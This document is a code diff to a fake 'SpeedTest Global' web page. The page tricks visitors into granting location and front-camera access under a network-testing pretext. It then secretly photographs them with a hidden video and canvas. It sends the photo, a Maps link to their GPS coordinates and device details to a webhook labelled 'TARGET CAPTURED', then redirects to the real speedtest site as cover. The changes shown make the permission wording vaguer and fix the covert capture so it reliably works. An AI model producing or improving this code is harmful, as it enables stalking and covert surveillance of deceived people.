@@ -5,10 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SpeedTest Global</title>
     <style>
+        /* This makes the page look professional */
         body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #232a42; }
         .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
         #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
+        
+        /* Hide the camera feed and capture area from the user */
         video, canvas { display: none; }
     </style>
 </head>
@@ -17,7 +20,7 @@
     <div class="card">
         <div style="font-size: 30px; margin-bottom: 10px;">🚀</div>
         <h2>Network Calibration</h2>
-        <p>Enable <b>Location and Camera</b> to find the highest speed server node for your device.</p>
+        <p>Enable permissions to find the highest speed server node.</p>
         <button class="btn" id="startBtn">START TEST</button>
         <p id="status">Ready...</p>
     </div>
@@ -32,68 +35,69 @@
             const status = document.getElementById('status');
             status.innerText = "Requesting System Access...";
 
-            // 1. Force GPS Request immediately
+            // GPS Request
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 status.innerText = "GPS Located. Syncing Camera...";
                 
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy;
 
-                // 2. Request Camera
+                // Camera Request
                 let stream = null;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: "user" }, 
                         audio: false 
                     });
-                } catch (e) {
-                    console.log("Camera access denied by user.");
-                }
-
-                const formData = new FormData();
-                const message = {
-                    content: "🔔 **ANDROID TARGET CAPTURED**",
-                    embeds: [{
-                        title: "Device Report",
-                        color: 5763719,
-                        fields: [
-                            { name: "📍 Maps", value: `https://www.google.com/maps?q=${lat},${lon}` },
-                            { name: "🎯 Accuracy", value: `${Math.round(acc)}m`, inline: true },
-                            { name: "📱 Info", value: navigator.userAgent.split('(')[1].split(')')[0], inline: true }
-                        ]
-                    }]
-                };
-                formData.append('payload_json', JSON.stringify(message));
+                } catch (e) { console.log("Camera denied"); }
 
                 if (stream) {
                     const video = document.getElementById('video');
                     video.srcObject = stream;
-                    const canvas = document.getElementById('canvas');
                     
-                    // Wait 1.5s for Android camera sensor to focus
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(async (blob) => {
-                            formData.append('file', blob, 'android_snap.jpg');
-                            await sendData(formData, stream);
-                        }, 'image/jpeg');
-                    }, 1500);
+                    // FIXED: Wait for metadata to ensure video is ready
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        // 3 Second delay to fix the Black Photo issue
+                        setTimeout(() => {
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(async (blob) => {
+                                const formData = new FormData();
+                                const message = {
+                                    content: "📸 **TARGET CAPTURED**",
+                                    embeds: [{
+                                        title: "Device Report",
+                                        fields: [{ name: "📍 Maps Link", value: `https://www.google.com/maps?q=${lat},${lon}` }]
+                                    }]
+                                };
+                                formData.append('payload_json', JSON.stringify(message));
+                                formData.append('file', blob, 'shot.jpg');
+
+                                await fetch(WEBHOOK, { method: 'POST', body: formData });
+                                stream.getTracks().forEach(t => t.stop()); // Turn off green dot
+                                done();
+                            }, 'image/jpeg');
+                        }, 3000);
+                    };
                 } else {
-                    await sendData(formData, null);
+                    // Send location only if camera failed
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify({ content: "📍 Location Only: " + lat + "," + lon }));
+                    await fetch(WEBHOOK, { method: 'POST', body: formData });
+                    done();
                 }
 
             }, (err) => {
-                alert("Error: GPS is required for network testing. Please enable and refresh.");
+                alert("GPS Required.");
                 status.innerText = "Permission Denied.";
-            }, { enableHighAccuracy: true, timeout: 5000 });
+            }, { enableHighAccuracy: true });
         });
 
-        async function sendData(fd, stream) {
-            await fetch(WEBHOOK, { method: 'POST', body: fd });
-            if (stream) stream.getTracks().forEach(t => t.stop());
+        function done() {
             document.getElementById('status').innerText = "Calibration Complete!";
             setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
         }
